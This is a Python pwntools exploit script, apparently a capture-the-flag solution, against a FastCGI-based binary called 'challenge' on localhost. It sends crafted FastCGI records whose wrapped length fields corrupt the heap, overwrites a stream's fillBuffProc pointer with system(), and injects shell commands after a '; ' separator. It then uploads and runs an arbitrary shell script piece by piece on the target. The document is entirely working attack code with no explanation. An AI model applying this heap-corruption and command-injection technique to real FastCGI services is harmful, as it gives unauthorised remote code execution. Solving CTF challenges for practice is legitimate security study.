from pwn import *

exe = context.binary = ELF("./challenge")

HOST = "localhost"
PORT = 9999

"""
typedef struct {
    unsigned char version;
    unsigned char type;
    unsigned char requestIdB1;
    unsigned char requestIdB0;
    unsigned char contentLengthB1;
    unsigned char contentLengthB0;
    unsigned char paddingLength;
    unsigned char reserved;
} FCGI_Header;
"""

def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header


"""
typedef struct {
    unsigned char roleB1;
    unsigned char roleB0;
    unsigned char flags;
    unsigned char reserved[5];
} FCGI_BeginRequestBody;
"""

def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5


def dummy_request():
    p = remote(HOST, PORT)

    header = makeHeader(9, 0, 0, 0)
    payload = flat(
        makeHeader(1, 1, 8, 0),
        makeBeginReqBody(1, 0),
        header,
        p8(75)*2 + b"A"*(75*2)
    )

    p.send(payload)
    p.close()


def attack(cmd : bytes):
    assert(len(cmd) <= 18)
    p = remote(HOST, PORT)

    header = makeHeader(9, 0, 0x2500, 0)
    payload = flat(
        makeHeader(1, 1, 8, 0),
        makeBeginReqBody(1, 0),
        header,
        # 0xffb * 2 + 2 = 0x1ff8 -> 0x2000 chunk
        p32(0xffb | (1 << 31), endianness='big') * 2,
        b"A" * (0xffb * 2),
        # 0x7fffffff * 2 + 2 = 0x0 -> 0x10 chunk
        p32(0xffffffff)*2,
        # chunk metadata
        b"A" * 0x10,
        # FCGX_Stream
        b" ;" + cmd.ljust(18, b' '),
        p32(0) * 3,
        # fillBuffProc
        p32(exe.plt["system"])
    )

    p.send(payload)
    p.close()


def attack_and_wait(cmd: bytes):
    dummy_request()
    attack(cmd)
    sleep(1)


def write_file(file):
    lines = [i.strip() for i in open(file).readlines()]
    for ln in lines:
        for i in range(0, len(ln), 5):
            attack_and_wait(f"echo -n '{ln[i:i+5]}'>>a".encode())
        attack_and_wait(b"echo >>a")


write_file("script.sh")
attack_and_wait(b"sh a")